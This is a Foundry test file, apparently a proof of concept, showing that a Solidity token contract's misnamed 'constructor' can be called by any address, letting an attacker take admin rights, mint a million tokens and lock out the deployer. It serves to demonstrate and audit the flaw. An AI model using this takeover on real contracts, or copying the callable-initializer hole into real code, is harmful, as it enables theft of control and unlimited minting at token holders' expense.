// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/A25.sol";

contract A25Test is Test {
    Angelglorycoin token;
    address deployer = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        // Deployer creates contract (but constructor doesn't run!)
        vm.prank(deployer);
        token = new Angelglorycoin();
    }

    function testConstructorVulnerability() public {
        // 1. Verify admin was never set
        assertEq(token.admin(), address(0));

        // 2. Attacker calls the misnamed "constructor"
        vm.prank(attacker);
        token.TokenERC20(); // Successfully executes!

        // 3. Attacker now has admin privileges
        assertEq(token.admin(), attacker);

        // 4. Attacker can mint unlimited tokens
        vm.prank(attacker);
        token.mint(attacker, 1_000_000 * 10**18);
        assertEq(token.balanceOf(attacker), 2_000_000 * 10**18); // Initial + new mint
    }

    function testDeployerLockout() public {
        // 1. Attacker takes over
        vm.prank(attacker);
        token.TokenERC20();

        // 2. Original deployer can't mint
        vm.prank(deployer);
        vm.expectRevert("Only admin");
        token.mint(deployer, 100e18);
    }
}